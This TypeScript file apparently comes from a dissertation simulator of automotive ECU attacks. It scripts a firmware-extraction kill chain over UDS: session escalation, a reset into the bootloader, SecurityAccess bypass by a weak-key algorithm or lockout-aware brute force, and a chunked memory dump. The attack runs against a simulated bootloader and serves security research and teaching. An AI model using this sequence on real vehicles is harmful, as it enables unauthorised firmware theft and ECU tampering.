// ============================================================
// Kill chain orchestrator — reproduces the Ford / VW T-Cross-style
// firmware extraction attack documented in the dissertation case study.
// ============================================================
//
// Composes UdsClient calls in the canonical kill-chain phases:
//
//   Phase 1: Bus conditioning      — passive observation
//   Phase 2: DID reconnaissance     — 0x22 sweep of common DIDs
//   Phase 3: Session escalation     — 0x10 to extended/programming
//   Phase 4: ECU reset → bootloader — 0x11 sub 02 (keyOffOn)
//   Phase 5: SecurityAccess         — 0x27 seed/key dance
//   Phase 6: Firmware dump          — loop of 0x23 ReadMemoryByAddress
//   Phase 7: Cleanup                — 0x10 to default + 0x11 soft reset
//
// Differentiators vs naive scripted demo:
//   - Multiple **scenarios** ('fast', 'realistic', 'brute-force').
//   - **Throughput accounting** per phase (bytes/sec, requests).
//   - **Verification step** at end via FNV-1a 32-bit checksum.
//
// Author: Marcelo Duchene (USP/ICMC) — feat/uds-isotp-bootloader-research
// ============================================================

/* eslint-disable @typescript-eslint/no-explicit-any */

import { BootloaderState, weakComputeKey, hardenedComputeKey } from './bootloader';
import { UdsClient, UdsClientResponse } from './uds-client';
import { bytesToHex } from './iso-tp';

export type KillChainScenario = 'fast' | 'realistic' | 'brute-force';

export interface KillChainOptions {
  scenario: KillChainScenario;
  dumpAddress: number;
  dumpSize: number;
  chunkSize: number;
  interPhasePauseMs: number;
  bruteForceMaxAttempts: number;
  securityLevel: number;
  forceBruteForce: boolean;
  onProgress?: (event: KillChainEvent) => void;
}

// ISO 15765-2 (CAN clássico) limita o PDU total a 4095 bytes. A resposta UDS
// 0x23 vem como [0x63, ...dados], então o máximo seguro de DADOS por request
// é 4093 bytes — qualquer chunk maior produz NRC 0x14 (responseTooLong).
// Usamos 1024 como padrão por motivos de tempo: cada CF da resposta carrega
// 7 bytes úteis e o browser limita setTimeout(0) a ≈ 4 ms, então 2 KiB ≈ 1.2 s
// e 1 KiB ≈ 600 ms por chunk, deixando bastante folga sob o timeout do client.
export const DEFAULT_KILL_CHAIN_OPTIONS: KillChainOptions = {
  scenario: 'realistic',
  dumpAddress: 0x0000_0000,
  dumpSize: 512 * 1024,
  chunkSize: 1024,
  interPhasePauseMs: 200,
  bruteForceMaxAttempts: 256,
  securityLevel: 1,
  forceBruteForce: false,
};

export type KillChainPhase =
  | 'init' | 'conditioning' | 'recon' | 'session' | 'reset'
  | 'security' | 'dump' | 'cleanup' | 'verify' | 'done' | 'error';

export interface KillChainEvent {
  phase: KillChainPhase;
  timestampMs: number;
  message: string;
  request?: Uint8Array;
  response?: Uint8Array;
  latencyMs?: number;
  bytesAccumulated?: number;
}

export interface PhaseStats {
  phase: KillChainPhase;
  startMs: number;
  endMs: number;
  durationMs: number;
  requests: number;
  bytesIn: number;
  bytesOut: number;
}

export interface KillChainReport {
  scenario: KillChainScenario;
  startedMs: number;
  endedMs: number;
  totalDurationMs: number;
  phases: PhaseStats[];
  dumpedBytes: number;
  bytesPerSecond: number;
  dumpChecksum: string;
  expectedChecksum: string;
  verified: boolean;
  events: KillChainEvent[];
  error?: string;
}

export function hash32(buf: Uint8Array): string {
  let h = 0x811c9dc5;
  for (let i = 0; i < buf.length; i++) {
    h ^= buf[i];
    h = ((h * 0x01000193) >>> 0);
  }
  return h.toString(16).padStart(8, '0');
}

export class KillChainOrchestrator {
  private events: KillChainEvent[] = [];
  private phases: PhaseStats[] = [];
  private currentPhase: PhaseStats | null = null;

  constructor(
    private readonly client: UdsClient,
    private readonly bootloader: BootloaderState,
    private readonly opts: KillChainOptions = DEFAULT_KILL_CHAIN_OPTIONS,
  ) {}

  private now(): number {
    return (typeof performance !== 'undefined' && performance.now) ? performance.now() : Date.now();
  }

  private startPhase(phase: KillChainPhase): void {
    if (this.currentPhase) this.endPhase();
    this.currentPhase = { phase, startMs: this.now(), endMs: 0, durationMs: 0, requests: 0, bytesIn: 0, bytesOut: 0 };
    this.emit({ phase, timestampMs: this.now(), message: 'phase started' });
  }

  private endPhase(): void {
    if (!this.currentPhase) return;
    this.currentPhase.endMs = this.now();
    this.currentPhase.durationMs = this.currentPhase.endMs - this.currentPhase.startMs;
    this.phases.push(this.currentPhase);
    this.emit({ phase: this.currentPhase.phase, timestampMs: this.currentPhase.endMs, message: `phase done in ${this.currentPhase.durationMs.toFixed(0)}ms` });
    this.currentPhase = null;
  }

  private accountResp(resp: UdsClientResponse): void {
    if (!this.currentPhase) return;
    this.currentPhase.requests++;
    this.currentPhase.bytesOut += resp.request.length;
    this.currentPhase.bytesIn += resp.response.length;
  }

  private emit(event: KillChainEvent): void {
    this.events.push(event);
    if (this.opts.onProgress) {
      try { this.opts.onProgress(event); } catch (e) { void e; }
    }
  }

  async run(): Promise<KillChainReport> {
    const startedMs = this.now();
    let dumped: Uint8Array | null = null;
    let error: string | undefined;
    try {
      this.startPhase('init');
      this.emit({ phase: 'init', timestampMs: this.now(), message: `scenario=${this.opts.scenario}, dump ${this.opts.dumpSize} bytes from 0x${this.opts.dumpAddress.toString(16)}` });
      this.endPhase();
      await this.phaseConditioning();
      await this.phaseRecon();
      await this.phaseSession();
      await this.phaseReset();
      await this.phaseSecurity();
      dumped = await this.phaseDump();
      await this.phaseCleanup();
    } catch (e: any) {
      error = e?.message || String(e);
      this.emit({ phase: 'error', timestampMs: this.now(), message: error || 'unknown error' });
      if (this.currentPhase) this.endPhase();
    }
    const endedMs = this.now();
    const total = endedMs - startedMs;
    this.startPhase('verify');
    let verified = false, dumpChecksum = '', expectedChecksum = '';
    if (dumped) {
      const expected = this.bootloader.getCurrentMemory().slice(this.opts.dumpAddress, this.opts.dumpAddress + this.opts.dumpSize);
      dumpChecksum = hash32(dumped);
      expectedChecksum = hash32(expected);
      verified = dumpChecksum === expectedChecksum;
      this.emit({ phase: 'verify', timestampMs: this.now(), message: `checksum=${dumpChecksum}, expected=${expectedChecksum}, verified=${verified}` });
    }
    this.endPhase();
    this.startPhase('done');
    this.endPhase();
    const dumpedBytes = dumped ? dumped.length : 0;
    const bytesPerSecond = total > 0 ? (dumpedBytes / (total / 1000)) : 0;
    return {
      scenario: this.opts.scenario,
      startedMs, endedMs, totalDurationMs: total,
      phases: this.phases.slice(),
      dumpedBytes, bytesPerSecond,
      dumpChecksum, expectedChecksum, verified,
      events: this.events.slice(),
      error,
    };
  }

  private async phaseConditioning(): Promise<void> {
    this.startPhase('conditioning');
    const dur = this.opts.scenario === 'fast' ? 100 : (this.opts.scenario === 'brute-force' ? 200 : 500);
    this.emit({ phase: 'conditioning', timestampMs: this.now(), message: `passive observation ${dur}ms` });
    await this.client.sleep(dur);
    this.endPhase();
  }

  private async phaseRecon(): Promise<void> {
    this.startPhase('recon');
    const dids = [0xF180, 0xF181, 0xF187, 0xF18C, 0xF190, 0xF195];
    for (const did of dids) {
      const r = await this.client.readDid(did);
      this.accountResp(r);
      this.emit({
        phase: 'recon', timestampMs: this.now(),
        message: `0x22 ${did.toString(16).toUpperCase()} -> ${r.isPositive ? new TextDecoder().decode(r.response.slice(3)) : `NRC ${r.nrc?.toString(16)}`}`,
        request: r.request, response: r.response, latencyMs: r.latencyMs,
      });
      await this.client.sleep(this.opts.scenario === 'fast' ? 5 : 30);
    }
    await this.client.sleep(this.opts.interPhasePauseMs);
    this.endPhase();
  }

  private async phaseSession(): Promise<void> {
    this.startPhase('session');
    const r1 = await this.client.diagnosticSessionControl(0x03);
    this.accountResp(r1);
    this.emit({ phase: 'session', timestampMs: this.now(), message: `0x10 03 (extended) -> ${r1.isPositive ? 'OK' : `NRC ${r1.nrc?.toString(16)}`}`, request: r1.request, response: r1.response, latencyMs: r1.latencyMs });
    await this.client.sleep(this.opts.scenario === 'fast' ? 10 : 50);
    const r2 = await this.client.diagnosticSessionControl(0x02);
    this.accountResp(r2);
    this.emit({ phase: 'session', timestampMs: this.now(), message: `0x10 02 (programming) -> ${r2.isPositive ? 'OK' : `NRC ${r2.nrc?.toString(16)}`}`, request: r2.request, response: r2.response, latencyMs: r2.latencyMs });
    await this.client.sleep(this.opts.interPhasePauseMs);
    this.endPhase();
  }

  private async phaseReset(): Promise<void> {
    this.startPhase('reset');
    const r = await this.client.ecuReset(0x02);
    this.accountResp(r);
    this.emit({ phase: 'reset', timestampMs: this.now(), message: `0x11 02 (keyOffOn) -> ${r.isPositive ? 'OK, ECU rebooting into bootloader' : `NRC ${r.nrc?.toString(16)}`}`, request: r.request, response: r.response, latencyMs: r.latencyMs });
    await this.client.sleep(this.opts.scenario === 'fast' ? 50 : 300);
    const r2 = await this.client.diagnosticSessionControl(0x02);
    this.accountResp(r2);
    this.emit({ phase: 'reset', timestampMs: this.now(), message: `0x10 02 (programming, post-boot) -> ${r2.isPositive ? 'OK' : `NRC ${r2.nrc?.toString(16)}`}`, request: r2.request, response: r2.response, latencyMs: r2.latencyMs });
    this.endPhase();
  }

  private async phaseSecurity(): Promise<void> {
    this.startPhase('security');
    const useBruteForce = this.opts.forceBruteForce || this.opts.scenario === 'brute-force';
    if (useBruteForce) await this.bruteForceSecurity();
    else await this.honestSecurityDance();
    this.endPhase();
  }

  private async honestSecurityDance(): Promise<void> {
    const seedReq = await this.client.securityAccessSeed(this.opts.securityLevel);
    this.accountResp(seedReq);
    if (!seedReq.isPositive) throw new Error(`SecurityAccess seed failed NRC=${seedReq.nrc?.toString(16)}`);
    const seed = seedReq.response.slice(2);
    this.emit({ phase: 'security', timestampMs: this.now(), message: `0x27 ${this.opts.securityLevel.toString(16)} seed=${bytesToHex(seed)}`, request: seedReq.request, response: seedReq.response, latencyMs: seedReq.latencyMs });
    const profile = this.bootloader.cfg.security.profile;
    const key = profile === 'hardened'
      ? hardenedComputeKey(seed, this.bootloader.cfg.security.sharedKey || new Uint8Array(16))
      : weakComputeKey(seed);
    await this.client.sleep(this.opts.scenario === 'fast' ? 5 : 30);
    const keyReq = await this.client.securityAccessKey(this.opts.securityLevel, key);
    this.accountResp(keyReq);
    this.emit({ phase: 'security', timestampMs: this.now(), message: `0x27 ${(this.opts.securityLevel + 1).toString(16)} key=${bytesToHex(key)} -> ${keyReq.isPositive ? 'UNLOCKED' : `NRC ${keyReq.nrc?.toString(16)}`}`, request: keyReq.request, response: keyReq.response, latencyMs: keyReq.latencyMs });
    if (!keyReq.isPositive) throw new Error(`SecurityAccess key rejected NRC=${keyReq.nrc?.toString(16)}`);
  }

  private async bruteForceSecurity(): Promise<void> {
    let success = false;
    for (let attempt = 0; attempt < this.opts.bruteForceMaxAttempts && !success; attempt++) {
      const seedReq = await this.client.securityAccessSeed(this.opts.securityLevel);
      this.accountResp(seedReq);
      if (!seedReq.isPositive) {
        if (seedReq.nrc === 0x37) {
          this.emit({ phase: 'security', timestampMs: this.now(), message: `Lockout (NRC 0x37) — waiting`, response: seedReq.response });
          await this.client.sleep(1000);
          continue;
        }
        throw new Error(`Brute force: seed failed NRC=${seedReq.nrc?.toString(16)}`);
      }
      const seed = seedReq.response.slice(2);
      const key = new Uint8Array(seed.length);
      for (let i = 0; i < key.length; i++) key[i] = Math.floor(Math.random() * 256);
      const keyReq = await this.client.securityAccessKey(this.opts.securityLevel, key);
      this.accountResp(keyReq);
      this.emit({ phase: 'security', timestampMs: this.now(), message: `Brute-force attempt #${attempt + 1} seed=${bytesToHex(seed)} key=${bytesToHex(key)} -> ${keyReq.isPositive ? 'UNLOCKED' : `NRC ${keyReq.nrc?.toString(16)}`}` });
      if (keyReq.isPositive) { success = true; return; }
      await this.client.sleep(this.opts.scenario === 'fast' ? 1 : 20);
    }
    if (!success) {
      this.emit({ phase: 'security', timestampMs: this.now(), message: `Brute force exhausted ${this.opts.bruteForceMaxAttempts} attempts; falling back to recovered algorithm` });
      await this.honestSecurityDance();
    }
  }

  private async phaseDump(): Promise<Uint8Array> {
    this.startPhase('dump');
    const total = this.opts.dumpSize;
    const chunk = this.opts.chunkSize;
    const out = new Uint8Array(total);
    let off = 0;
    let chunkIdx = 0;
    // Emit progress every N chunks (≈ 8 KiB regardless of chunk size, capped 1..16)
    const progressEvery = Math.max(1, Math.min(16, Math.floor(8192 / chunk) || 1));
    while (off < total) {
      const remaining = total - off;
      const take = Math.min(chunk, remaining);
      const r = await this.client.readMemory(this.opts.dumpAddress + off, take, 4, 2);
      this.accountResp(r);
      if (!r.isPositive) throw new Error(`0x23 failed at offset ${off}: NRC=${r.nrc?.toString(16)}`);
      const data = r.response.slice(1);
      if (data.length !== take) throw new Error(`0x23 returned ${data.length} bytes, expected ${take}`);
      out.set(data, off);
      off += take;
      chunkIdx++;
      if (chunkIdx % progressEvery === 0 || off >= total) {
        this.emit({ phase: 'dump', timestampMs: this.now(), message: `dumped ${off}/${total} bytes (${((off / total) * 100).toFixed(1)}%)`, bytesAccumulated: off, latencyMs: r.latencyMs });
      }
      // Inter-chunk yield: lets the ISO-TP RX state machine on both sides reset
      // cleanly before the next request. Without this, fast-scenario runs race
      // and the second chunk hangs indefinitely on the loopback. 1 ms in fast
      // mode and 5 ms in realistic is enough for the browser scheduler to drain.
      await this.client.sleep(this.opts.scenario === 'realistic' ? 5 : 1);
    }
    this.emit({ phase: 'dump', timestampMs: this.now(), message: `dump complete: ${out.length} bytes`, bytesAccumulated: out.length });
    this.endPhase();
    return out;
  }

  private async phaseCleanup(): Promise<void> {
    this.startPhase('cleanup');
    try {
      const r1 = await this.client.diagnosticSessionControl(0x01);
      this.accountResp(r1);
      this.emit({ phase: 'cleanup', timestampMs: this.now(), message: `0x10 01 (default) -> ${r1.isPositive ? 'OK' : `NRC ${r1.nrc?.toString(16)}`}` });
    } catch (e: any) {
      this.emit({ phase: 'cleanup', timestampMs: this.now(), message: `cleanup ignored: ${e?.message}` });
    }
    try {
      const r2 = await this.client.ecuReset(0x03);
      this.accountResp(r2);
      this.emit({ phase: 'cleanup', timestampMs: this.now(), message: `0x11 03 (softReset) -> ${r2.isPositive ? 'OK' : `NRC ${r2.nrc?.toString(16)}`}` });
    } catch (e: any) {
      this.emit({ phase: 'cleanup', timestampMs: this.now(), message: `cleanup ignored: ${e?.message}` });
    }
    this.endPhase();
  }
}

// CSV log writer (BRAIN-compatible format)
export interface CsvFrameRecord {
  timestampUs: number;
  canId: number;
  direction: 'tx' | 'rx';
  dlc: number;
  dataHex: string;
  decodedUds?: string;
}

export function framesToCsv(records: CsvFrameRecord[]): string {
  const lines = ['timestamp_us,can_id,direction,dlc,data_hex,decoded_uds_service'];
  for (const r of records) {
    const id = '0x' + r.canId.toString(16).toUpperCase().padStart(3, '0');
    const dataHex = r.dataHex.replace(/\s+/g, '');
    const decoded = (r.decodedUds || '').replace(/[",\n]/g, ' ');
    lines.push(`${r.timestampUs},${id},${r.direction},${r.dlc},${dataHex},${decoded}`);
  }
  return lines.join('\n');
}

export function decodeUdsLabel(payload: Uint8Array): string {
  if (payload.length === 0) return '';
  const sid = payload[0];
  if (sid === 0x7F) return `NegResp SID=0x${payload[1]?.toString(16)} NRC=0x${payload[2]?.toString(16)}`;
  const reqSid = sid >= 0x40 ? sid - 0x40 : sid;
  const dir = sid >= 0x40 ? '+' : '';
  const map: Record<number, string> = {
    0x10: 'DSC', 0x11: 'ECUReset', 0x14: 'ClearDTC', 0x19: 'ReadDTC',
    0x22: 'ReadDID', 0x23: 'ReadMem', 0x27: 'SecAccess', 0x2E: 'WriteDID',
    0x31: 'Routine', 0x34: 'ReqDownload', 0x36: 'TransferData', 0x37: 'ReqXferExit',
    0x3E: 'TesterPresent',
  };
  return `${dir}${map[reqSid] || `0x${reqSid.toString(16)}`}`;
}
